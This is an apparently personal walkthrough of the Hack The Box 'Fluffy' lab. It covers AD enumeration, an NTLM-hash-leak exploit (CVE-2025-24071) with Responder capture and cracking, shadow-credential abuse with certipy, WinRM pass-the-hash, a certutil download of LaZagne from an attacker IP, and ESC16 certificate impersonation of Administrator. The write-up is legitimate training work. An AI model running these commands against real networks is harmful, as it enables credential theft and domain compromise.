==
tags: #windows #active-directory #ad

==

* scenario
  As is common in real life Windows pentests, you will start the Fluffy box with credentials
  for the following account: =j.fleischman / J0elTHEM4n1990!=
* nmap scan
  #+begin_src bat
  $ sudo nmap -A 10.10.11.69

PORT     STATE SERVICE       VERSION                                                                                                                                                                                                        
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-10 15:30:48Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)                                                                                                                  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m54s, deviation: 0s, median: 7h00m53s
| smb2-time:
|   date: 2025-10-10T15:31:39
|_  start_date: N/A
  #+end_src
* enumerate shares
  #+begin_src bat
  smbmap -H 10.10.11.69
  #+end_src
  returns nothing
  #+begin_src bat
  $ netexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --shares

SMB 10.10.11.69     445    DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB 10.10.11.69     445    DC01 [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB 10.10.11.69     445    DC01 [*] Enumerated shares
SMB 10.10.11.69     445    DC01 Share           Permissions     Remark
SMB 10.10.11.69     445    DC01 -----           -----------     ------
SMB 10.10.11.69     445    DC01 ADMIN$                          Remote Admin
SMB 10.10.11.69     445    DC01 C$                              Default share
SMB 10.10.11.69     445    DC01 IPC$            READ            Remote IPC
SMB 10.10.11.69     445    DC01 IT              READ,WRITE      
SMB 10.10.11.69     445    DC01 NETLOGON        READ            Logon server share 
SMB 10.10.11.69     445    DC01 SYSVOL          READ            Logon server share 
  #+end_src
** spider
   #+begin_src bat
   $ netexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --shares -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
   #+end_src
   this lists interesting files including KeePass files so let's download all of them
   #+begin_src bat
   $ netexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --shares -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false
   #+end_src
   this didn't really do anything
** let's just mount the share
   #+begin_src bat
   $ sudo mkdir /mnt/fluffy
   $ sudo mount -t cifs -o username=j.fleischman,password=J0elTHEM4n1990! //10.10.11.69/IT /mnt/fluffy
   #+end_src
* enumerate users
  #+begin_src 
  $ netexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --users

SMB 10.10.11.69     445    DC01 [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB 10.10.11.69     445    DC01 -Username-                    -Last PW Set-       -BadPW- -Description-
SMB 10.10.11.69     445    DC01 Administrator                 2025-04-17 15:45:01 0       Built-in account for administering the computer/domain 
SMB 10.10.11.69     445    DC01 Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB 10.10.11.69     445    DC01 krbtgt                        2025-04-17 16:00:02 0       Key Distribution Center Service Account 
SMB 10.10.11.69     445    DC01 ca_svc                        2025-04-17 16:07:50 0        
SMB 10.10.11.69     445    DC01 ldap_svc                      2025-04-17 16:17:00 0        
SMB 10.10.11.69     445    DC01 p.agila                       2025-04-18 14:37:08 0        
SMB 10.10.11.69     445    DC01 winrm_svc                     2025-05-18 00:51:16 0        
SMB 10.10.11.69     445    DC01 j.coffey                      2025-04-19 12:09:55 0        
SMB 10.10.11.69     445    DC01 j.fleischman                  2025-05-16 14:46:55 0        
SMB 10.10.11.69     445    DC01 [*] Enumerated 9 local users: FLUFFY
  #+end_src
** get logged-on users
   #+begin_src bat
   $ netexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --loggedon-users 

SMB 10.10.11.69     445    DC01 [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB 10.10.11.69     445    DC01 [-] Error enumerating logged on users: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
   #+end_src
* rpcclient
** domain users
  #+begin_src bat
  $ rpcclient 10.10.11.69 --user j.fleischman --password J0elTHEM4n1990!

rpcclient $> enumdomusers                                                                                             

user:[Administrator] rid:[0x1f4]                                                                                      
user:[Guest] rid:[0x1f5]                                 
user:[krbtgt] rid:[0x1f6]                                                                                             
user:[ca_svc] rid:[0x44f]                                                                                             
user:[ldap_svc] rid:[0x450]                                                                                           
user:[p.agila] rid:[0x641]                                                                                            
user:[winrm_svc] rid:[0x643]                                                                                          
user:[j.coffey] rid:[0x645]                                                                                           
user:[j.fleischman] rid:[0x646]   
  #+end_src
** domain groups
   #+begin_src 
   rpcclient $> enumdomgroups

group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Service Account Managers] rid:[0x644]
group:[Service Accounts] rid:[0x647]
   #+end_src
** domain info
   #+begin_src 
   rpcclient $> querydominfo

Domain:         FLUFFY
Server:
Comment:
Total Users:    43
Total Groups:   0
Total Aliases:  17
Sequence No:    1
Force Logoff:   18446744073709551615
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
   #+end_src
** password info
   #+begin_src
   rpcclient $> getdompwinfo

min_password_length: 7
password_properties: 0x00000000
   #+end_src
* windapsearch
  #+begin_src bat
  python3 windapsearch.py --dc-ip 10.10.11.69 -u j.fleischman@FLUFFY -p J0elTHEM4n1990! --da
  #+end_src
  this is not installed and has other dependencies; and this is not something we do in any of
  the labs either so let's park it for now
* psexec.py
  #+begin_src bat
  $ impacket-psexec FLUFFY/j.fleischman:'J0elTHEM4n1990!'@10.10.11.69
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.69.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[*] Found writable share IT
[*] Uploading file RmfPCQkH.exe
[*] Opening SVCManager on 10.10.11.69.....
[-] Error opening SVCManager on 10.10.11.69.....
[-] Error performing the installation, cleaning up: Unable to open SVCManager
  #+end_src
* wmiexec.py
  #+begin_src bat
  $ impacket-wmiexec FLUFFY/j.fleischman:'J0elTHEM4n1990!'@10.10.11.69
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[-] Could not connect: timed out
  #+end_src
* kerberoasting
  the target is possibly vulnerable to a kerberaosting attack; so let's verify
  #+begin_src bat
  Impacket-GetUserSPNs -dc-ip 10.10.11.69 FLUFFY/j.fleischman

Password:
[-] Error in searchRequest -> referral: 0000202B: RefErr: DSID-0310084A, data 0, 1 access points
        ref 1: 'fluffy'
  #+end_src
* what's a way into this machine
  let's start with the guided mode
* what's the FQDN of the Domain Controller in Certified 
  what does this even mean? what's certified?
** HINT
   suggests looking at nmap output; running it with =-sV= and =-sC=
   #+begin_src bat
   $ sudo nmap -sC -sV -p- -T4 10.10.11.69

PORT      STATE SERVICE       VERSION                                                                                                                                                                                                       
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-11 12:53:00Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site:
|_ssl-date: 2025-10-11T12:54:30+00:00; +7h00m21s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before:
|_Not valid after:  2026-04-17T16:04:17
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-10-11T12:54:31+00:00; +7h00m21s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-10-11T12:54:30+00:00; +7h00m21s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-11T12:54:31+00:00; +7h00m21s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49783/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
   #+end_src
   ok, it turns out we've stripped it from the earlier nmap output (=-A= combines =-sC= and =-sV=);
   anyway, the answer is =DC01.fluffy.htb=; as for =Certified=, copilot says it might be the name
   of the track? maybe it was a mistake, not sure.
* what's the name of the pdf document in the SMB share
  it's =Upgrade_Notice.pdf=; we'd seen it of course and just completely ignored it.
* From the list of CVEs mentioned in the PDF, which one allows an attacker leak an NTLM hash
  here are the CVEs mentioned in the doc
  | CVE ID         | Severity |
  |----------------+----------|
  | CVE-2025-24996 | Critical |
  | CVE-2025-24071 | Critical |
  | CVE-2025-46785 | High     |
  | CVE-2025-29968 | High     |
  | CVE-2025-21193 | Medium   |
  | CVE-2025-3445  | Low      |
  the vuln database descriptions for the vulns from the list:
  *[[https://nvd.nist.gov/vuln/detail/CVE-2025-24996][CVE-2025-24996]]* - External control of file name or path in Windows NTLM allows an
  unauthorized attacker to perform spoofing over a network.
  [[https://nvd.nist.gov/vuln/detail/CVE-2025-24071][CVE-2025-24071]] - Exposure of sensitive information to an unauthorized actor in Windows File
  Explorer allows an unauthorized attacker to perform spoofing over a network.
  however, a duckduckgo search for the above generates an ai answer which says:
  #+begin_src 
  CVE-2025-24071 is a vulnerability in Windows Explorer that can leak NTLM hashes when a
  malicious .library-ms file is extracted from a ZIP archive. This issue can be exploited
  using a Metasploit module designed for this specific vulnerability.
  #+end_src
  there's a [[https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom][link]] to the corresponding github repo
  #+begin_src 
  This repository contains a Metasploit module to exploit CVE-2025-24071, a vulnerability in
  Windows Explorer that leaks NTLM hashes when a malicious .library-ms file is extracted from
  a ZIP archive.
  #+end_src
  we have to clone the repo and add it manually to the collection to use it from msfconsole
  #+begin_src bat
  $ git clone https://github.com/FOLKS-IWD/CVE-2025-24071-msfvenom.git
  $ cd CVE-2025-24071-msfvenom
  $ sudo cp ntlm_hash_leak.rb /usr/share/metasploit-framework/modules/auxiliary/server/
  #+end_src
** generate exploit.zip file from msfconsole
   #+begin_src bat
   msf > use auxiliary/server/ntlm_hash_leak
   msf auxiliary(server/ntlm_hash_leak) > options

Module options (auxiliary/server/ntlm_hash_leak):

   Name          Current Setting       Required  Description
   ----          ---------------       --------  -----------
   ATTACKER_IP                         yes       The IP address to which the SMB request will be sent
   FILENAME      exploit.zip           yes       The name of the ZIP file to create
   LIBRARY_NAME  malicious.library-ms  yes       The name of the .library-ms file
   SHARE_NAME    shared                yes       The SMB share name to use in the .library-ms file

msf auxiliary(server/ntlm_hash_leak) > set ATTACKER_IP tun0
ATTACKER_IP => tun0
msf auxiliary(server/ntlm_hash_leak) > set SHARE_NAME IT
SHARE_NAME => IT
msf auxiliary(server/ntlm_hash_leak) > run
[*] Malicious ZIP file created: exploit.zip
[*] Host the file and wait for the victim to extract it.
[*] Ensure you have an SMB capture server running to collect NTLM hashes.
[*] Auxiliary module execution completed
   #+end_src
** copy the exploit file to the share
   #+begin_src 
   $ netexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --share IT --put-file exploit.zip exploit.zip

SMB 10.10.11.69     445    DC01 [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB 10.10.11.69     445    DC01 [*] Copying exploit.zip to exploit.zip
SMB 10.10.11.69     445    DC01 [+] Created file exploit.zip on \\IT\exploit.zip
   #+end_src
*** confirm if it got copied
    #+begin_src bat
    $ netexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990!  --spider IT --regex .
    #+end_src
    this doesn't list the file; so i guess it didn't get copied?
*** smbclient
    #+begin_src bat
    $ smbclient '//10.10.11.69/IT' -U 'j.fleischman%J0elTHEM4n1990!'
    #+end_src
    use the =put= command here instead.
    #+begin_src bat
    $ smbclient '//10.10.11.69/IT' -U 'j.fleischman%J0elTHEM4n1990!'
Try "help" to get a list of possible commands.

    smb: \> put exploit.zip                                   
putting file exploit.zip as \exploit.zip (2.4 kb/s) (average 2.4 kb/s) 
    #+end_src
    we can confirm with =ls= that it's indeed been transferred. however, after starting
    responder, we don't get a hit. so instead, looking at the solution, there's another repo
    we can clone to get the exploit file.
    #+begin_src bat
    $ git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git
    $ cd CVE-2025-24071_PoC 
    $ python poc.py
Enter your file name: kavi
Enter IP (EX: 192.168.1.162): 10.10.16.9
completed                                                  
    $ ls                                                     
    exploit.zip  poc.py  README.md
    #+end_src
    once we transfer this version of =exploit.zip= and start responder, we get a connection from
    the =p.agila= user
*** responder
    #+begin_src bat
    $ sudo responder -I tun0
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:a4add2df4bb9a096:60922E1C1A0F36BEBE01FC4C242C5667:010100000000000080C7F8119F3ADC01F4BCA29E2D5E23F30000000002000800590042003000520001001E00570049004E002D0031004D004A0042004B00360053004C0058004600360004003400570049004E002D0031004D004A0042004B00360053004C005800460036002E0059004200300052002E004C004F00430041004C000300140059004200300052002E004C004F00430041004C000500140059004200300052002E004C004F00430041004C000700080080C7F8119F3ADC0106000400020000000800300030000000000000000100000000200000FFEF51162ECC1F169919CAC9C0EC2DB1F3563E210C48BB687B997968E5D729FF0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0039000000000000000000
    #+end_src
* crack the hash
  #+begin_src bat
  $ hashcat -m 5600 p.agila.hash /usr/share/wordlists/rockyou.txt
  prometheusx-303
  #+end_src
* netexec
  let's confirm if it works and see if we have any additional permissions
  #+begin_src 
  $ netexec smb 10.10.11.69 -u p.agila -p prometheusx-303 --shares

SMB 10.10.11.69     445    DC01  [+] fluffy.htb\p.agila:prometheusx-303 
SMB 10.10.11.69     445    DC01  [*] Enumerated shares
SMB 10.10.11.69     445    DC01  Share           Permissions     Remark
SMB 10.10.11.69     445    DC01  -----           -----------     ------
SMB 10.10.11.69     445    DC01  ADMIN$                          Remote Admin
SMB 10.10.11.69     445    DC01  C$                              Default share
SMB 10.10.11.69     445    DC01  IPC$            READ            Remote IPC
SMB 10.10.11.69     445    DC01  IT              READ,WRITE      
SMB 10.10.11.69     445    DC01  NETLOGON        READ            Logon server share 
SMB 10.10.11.69     445    DC01  SYSVOL          READ            Logon server share 
  #+end_src
  the one below had failed for j.fleischman let's see if it works for p.agila
  #+begin_src bat
  netexec smb 10.10.11.69 -u p.agila -p prometheusx-303 --loggedon-users 
  #+end_src
  but no, same issue with access
* getuserspn
  #+begin_src bat
  $ impacket-GetUserSPNs -dc-ip 10.10.11.69 DC01.fluffy.htb/p.agila
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] Error in searchRequest -> noSuchObject: 0000208D: NameErr: DSID-0310028C, problem 2001 (NO_OBJECT), data 0, best match of:
        'DC=fluffy,DC=htb'
  #+end_src
  ok, we had to add the domain names to /etc/hosts; let's do that first; that didn't help
* OFFICIAL SOLUTION
  #+begin_src 
  $ bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -dc 'dc01.fluffy.htb' -c all -ns 10.10.11.69
  #+end_src
  ok, a couple of things; more useful than just looking at the solution has been following
  along with [[https://www.youtube.com/watch?v=KvUC7bakm-E][ippsec's video]]. i had a doubt about why it is that we chose to run bloodhound
  only at this point - turns out we could have done it earlier and nothing would have changed.
  and it is in fact more logical to have run it earlier.
  NOTE: ippsec uses rusthound-ce instead and says it generates more data;
** TODO: install rusthound at some point
** bloodhound-ce
  ok, once we load the data into bloodhound-ce and do some analysis, we find that the user
  =p.agila= is a member of =Service Account Managers= Group which has *GenericAll* access to the
  =Service Accounts= Group which in turn has *Generic Write* access to =CA_SVC=, =LDAP_SVC=,
  and =WINRM_SVC=;
  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-10-12_15-55.png @ 2025-10-12 16:00:25
  [[file:OFFICIAL_SOLUTION/2025-10-12_16-00-25_2025-10-12_15-55.png]]
  so now, the path begins to become clear - we should add the =p.agila= user to the
  =Service Accounts= Group and access the target via WinRM
  NOTE: from the solution;
  #+begin_src 
  It should also be noted that the winrm_svc user is a part of the Remote Management Users ,
  which allows connecting to the target using WinRM
  #+end_src
** bloodyAD
   this tool was not a part of the AD module, but I'm not sure if something else was used in
   its place or if this scenario just never came up. (TODO: verify)
   so this tool allows us to interact with AD from linux and perform actions like adding users
   to groups and so on. (I'm sure it can do loads of other things as well)
   #+begin_src bat
   $ bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.10.11.69 add groupMember 'service accounts' p.agila
   #+end_src
** certipy-ad
   now, we'll use certipy-ad (another thing that never came up, but this one's already
   installed in kali), a tool that can add certificate-based login for users -
   these are called *Shadow Credentials*.
   copilot:
   #+begin_src bat
   By writing to msDS-KeyCredentialLink, you inject a KeyCredential blob that lets you
   authenticate as that user using PKINIT (Kerberos with certificates).
   This bypasses password-based authentication entirely.
   #+end_src
   let's add a certificate for =winrm_svc= and =ca_svc= users
   #+begin_src bat
   $ certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm_svc -dc-ip 10.10.11.69
   #+end_src
   running this should result in a response with an rc4 hash; but we have a clock skew issue
   we need to take care of:
   #+begin_src bat
   $ certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc                       
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'd72a0b18-2c8c-43cd-d735-2fd423c56062'
[*] Adding Key Credential with device ID 'd72a0b18-2c8c-43cd-d735-2fd423c56062' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'd72a0b18-2c8c-43cd-d735-2fd423c56062' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': None
   #+end_src
   so let's fix it with:
   #+begin_src bat
   $ sudo apt-get install ntpdate
   $ sudo ntpdate dc01.fluffy.htb
   #+end_src
   this didn't work; had to spend a lot of time trying to get it to work, and finally the
   below combination seems to have done the trick:
*** fix clock skew with ntpdate
    #+begin_src bat
    $ sudo systemctl stop systemd-timesyncd
    $ sudo ntpdate -u <hostname>
    #+end_src
*** get tgt hashes for winrm_svc and ca_svc
    #+begin_src bat
    $ certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '2f0f9b96-93c0-288e-280d-94b14d5cc968'
[*] Adding Key Credential with device ID '2f0f9b96-93c0-288e-280d-94b14d5cc968' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '2f0f9b96-93c0-288e-280d-94b14d5cc968' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
    #+end_src
    #+begin_src bat
    $ certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'de4b4e1b-e9c7-2b0f-382b-bfa45f5c4ce3'
[*] Adding Key Credential with device ID 'de4b4e1b-e9c7-2b0f-382b-bfa45f5c4ce3' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'de4b4e1b-e9c7-2b0f-382b-bfa45f5c4ce3' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
    #+end_src
* evilwinrm
  #+begin_src bat
  $ evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
  #+end_src
  this connects and gives us a shell, and we can find a flag on the desktop.
  #+begin_src 
  ,*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
3e1a5dd32f4866a8ce743bd693af3f12  
  #+end_src
* privilege escalation
  let's try and do this on our own
  let's check the privileges
  #+begin_src bat
  ,*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
=============================   ==============================   ======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  
  #+end_src
** lazagne
   #+begin_src bat
   wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe
   #+end_src
   now let's transfer it; set up a python server on 8123, then:
   #+begin_src 
   certutil -urlcache -split -f "http://10.10.16.9:8123/lazagne.exe" C:\Windows\Temp\lazagne.exe
   #+end_src
   now run it:
   #+begin_src bat
   C:\Windows\Temp\lazagne.exe all

0 passwords have been found.
   #+end_src
** OFFICIAL SOLUTION
   ok, at this point, it veers off into territory not really covered by the academy modules.
   #+begin_src bat
   $ certipy-ad find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'fluffy-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'fluffy-DC01-CA' via CSRA: Could not connect: timed out
[*] Trying to get CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'fluffy-DC01-CA'
[*] Saved BloodHound data to '20251015152807_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20251015152807_Certipy.txt'
[*] Saved JSON output to '20251015152807_Certipy.json'
   #+end_src
   the output didn't list the vuln because =certipy-ad= was out of date; update with
   #+begin_src bat
   sudo apt install --upgrade certipy-ad
   #+end_src
   rerun, and we get:
   #+begin_src bat
   $ cat 20251015153221_Certipy.txt

Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
   #+end_src
   [[https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally][here]] are the details about the =ESC= class of vulnerabilities related to AD CS misconfig and
   how certipy can detect/exploit them.
   the idea is something like:
   1. first update the UPN (User Principal Name) of the ca_svc user to administrator.
   #+begin_src bat
   $ certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator'

<SNIP>
[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
 userPrincipalName          : administrator
[*] Successfully updated 'ca_svc'
   #+end_src
   2. Then, a certificate should be requested as the =ca_svc= user. Since the =ca_svc= user's
      UPN has been updated to =administrator=, the resulting certificate will allow us to
      authenticate as the administrator user
   #+begin_src bat
   $ certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'

   <SNIP>
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
   #+end_src
   3. This will save the certificate for the Administrator user in =administrator.pfx=. Before
      using this certificate, the changed UPN of the =ca_svc= user should be updated to the
      correct one.
   #+begin_src bat
   $ certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'ca_svc@fluffy.htb'

<SNIP>
